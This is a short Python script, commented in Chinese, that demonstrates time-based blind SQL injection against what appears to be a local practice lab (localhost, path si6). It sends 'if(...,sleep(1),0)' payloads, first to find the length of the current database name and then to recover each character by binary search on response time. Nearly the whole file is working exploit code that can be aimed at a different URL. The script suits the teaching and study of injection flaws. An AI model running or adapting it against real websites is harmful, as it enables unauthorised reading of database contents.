# 演示：无提示情况下，用时间盲注猜 si6 的库名 database()
import requests, time

URL = "http://localhost:8083/si6/?id="

def ask(cond):
    payload = '1 and if(%s,sleep(1),0)' % cond
    t0 = time.time()
    try:
        requests.get(URL + payload, timeout=10)
    except Exception:
        pass
    return (time.time() - t0) > 0.6

# 第一步：猜库名长度
for n in range(1, 10):
    if ask('length(database())=%d' % n):
        print('1) 库名长度 =', n, ' (length(database())=%d -> True)' % n)
        break

# 第二步：逐字符猜库名（二分）
name = ''
for pos in range(1, 8):
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if ask('ascii(substr(database(),%d,1))>%d' % (pos, mid)):
            lo = mid + 1
        else:
            hi = mid
    ch = chr(lo)
    if ch == ' ' or ch == '}':
        break
    name += ch
    print('2) 猜库名:', name)

print('3) 结论：当前库名 =', name)
